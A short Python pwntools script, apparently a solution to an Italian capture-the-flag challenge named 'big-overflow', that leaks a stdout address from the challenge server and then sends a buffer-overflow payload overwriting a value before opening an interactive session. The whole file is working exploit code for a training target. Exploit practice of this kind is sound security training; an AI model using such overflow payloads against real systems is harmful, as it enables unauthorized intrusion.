from pwn import *
from Crypto.Util.number import bytes_to_long

r = connect("big-overflow.challs.olicyber.it", 34003)

print(r.recvline())

#ottenuto da ida
number = p32(0x5AB1BB0)
print(number)

r.send(b"a"*32)
r.recvuntil(b"a"*32)

#ottengo l'indirizzo di stdout
stdoutAddr = bytearray(r.recvuntil(b"but"))

for i in range(3):
    stdoutAddr.pop(len(stdoutAddr)-1)

r.sendline(b"a"*32 + stdoutAddr.ljust(8, b"\0") + number)
r.interactive()